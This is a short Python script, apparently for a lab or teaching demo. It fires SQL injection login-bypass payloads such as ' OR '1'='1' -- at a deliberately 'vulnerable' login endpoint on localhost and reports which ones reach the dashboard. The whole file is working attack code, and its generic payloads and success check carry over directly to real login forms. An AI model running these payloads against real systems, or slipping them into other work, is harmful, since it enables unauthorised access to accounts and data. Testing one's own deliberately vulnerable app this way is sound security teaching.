import requests


LOGIN_URL = "http://127.0.0.1:5000/vulnerable/login"

PAYLOADS = [
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "' OR 'a'='a' -- ",
]


def try_payload(payload: str) -> None:
    data = {"username": payload, "password": "anything"}

    try:
        response = requests.post(LOGIN_URL, data=data, allow_redirects=False, timeout=5)
    except requests.RequestException as exc:
        print(f"[ERROR] Payload {payload!r} -> request failed: {exc}")
        return

    location = response.headers.get("Location", "")
    redirected_to_dashboard = response.is_redirect and location.endswith("/dashboard")

    if redirected_to_dashboard:
        print(f"[SUCCESS] Payload {payload!r} -> redirected to /dashboard")
        return

    if response.status_code == 200:
        print(f"[FAILURE] Payload {payload!r} -> login page returned (status 200)")
    else:
        print(
            f"[FAILURE] Payload {payload!r} -> status {response.status_code}, "
            f"Location={location!r}"
        )


def main() -> None:
    print(f"Target: {LOGIN_URL}")
    for payload in PAYLOADS:
        try_payload(payload)


if __name__ == "__main__":
    main()
